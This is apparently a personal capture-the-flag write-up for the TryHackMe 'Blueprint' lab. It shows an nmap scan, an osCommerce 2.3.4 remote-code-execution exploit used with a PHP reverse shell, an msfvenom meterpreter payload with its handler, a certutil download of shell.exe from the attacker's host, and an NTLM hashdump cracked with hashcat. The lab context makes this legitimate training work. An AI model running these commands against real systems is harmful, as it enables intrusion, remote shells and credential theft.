
https://tryhackme.com/r/room/blueprint

---

Look at this sexy new nmap
```shell
sudo nmap -n -Pn -sS -p- --open -min-rate 5000 -vvv 10.10.152.243
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-24 20:13 CEST  
Initiating SYN Stealth Scan at 20:13  
Scanning 10.10.152.243 [65535 ports]  
Discovered open port 443/tcp on 10.10.152.243  
Discovered open port 80/tcp on 10.10.152.243  
Discovered open port 135/tcp on 10.10.152.243  
Discovered open port 445/tcp on 10.10.152.243  
Discovered open port 3306/tcp on 10.10.152.243  
Discovered open port 139/tcp on 10.10.152.243  
Discovered open port 8080/tcp on 10.10.152.243  
Discovered open port 49153/tcp on 10.10.152.243  
Discovered open port 49152/tcp on 10.10.152.243  
Discovered open port 49158/tcp on 10.10.152.243  
Discovered open port 49159/tcp on 10.10.152.243  
Discovered open port 49154/tcp on 10.10.152.243  
Discovered open port 49160/tcp on 10.10.152.243  
Completed SYN Stealth Scan at 20:13, 35.78s elapsed (65535 total ports)  
Nmap scan report for 10.10.152.243  
Host is up, received user-set (0.032s latency).  
Scanned at 2024-07-24 20:13:20 CEST for 35s  
Not shown: 46016 filtered tcp ports (no-response), 19506 closed tcp ports (reset)  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit  
PORT      STATE SERVICE      REASON  
80/tcp    open  http         syn-ack ttl 127  
135/tcp   open  msrpc        syn-ack ttl 127  
139/tcp   open  netbios-ssn  syn-ack ttl 127  
443/tcp   open  https        syn-ack ttl 127  
445/tcp   open  microsoft-ds syn-ack ttl 127  
3306/tcp  open  mysql        syn-ack ttl 127  
8080/tcp  open  http-proxy   syn-ack ttl 127  
49152/tcp open  unknown      syn-ack ttl 127  
49153/tcp open  unknown      syn-ack ttl 127  
49154/tcp open  unknown      syn-ack ttl 127  
49158/tcp open  unknown      syn-ack ttl 127  
49159/tcp open  unknown      syn-ack ttl 127  
49160/tcp open  unknown      syn-ack ttl 127  
  
Read data files from: /usr/bin/../share/nmap  
Nmap done: 1 IP address (1 host up) scanned in 35.90 seconds  
          Raw packets sent: 179460 (7.896MB) | Rcvd: 19928 (797.180KB)
```

On the port `8080` https, I found `oscommercie 2.3.4` and an exploit RCE on [exploit db](https://www.exploit-db.com/exploits/44374)

I replaced the `base_url` with my own and put the `PHP Ivan Sincek` payload from [revshells](https://www.revshells.com/)

I poped directly as `nt authority\system` so I was able to get the root flag directly

Then I setup a shell meterpreter
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.79.56 LPORT=9002 -f exe -o shell.exe
```

```shell
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.14.79.56
set LPORT 9002
exploit
```

I transfer `shell.exe` on the target
```powershell
certutil -urlcache -split -f "http://10.14.79.56:5050/shell.exe" C:\temp\shell.exe
```

I got `Lab`'s NTLM hash with `hashdump` in meterpreter

I was looking for the password with rockyou.txt but it was in another wordlist
```shell
hashcat -a 0 -m 1000 hash /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```
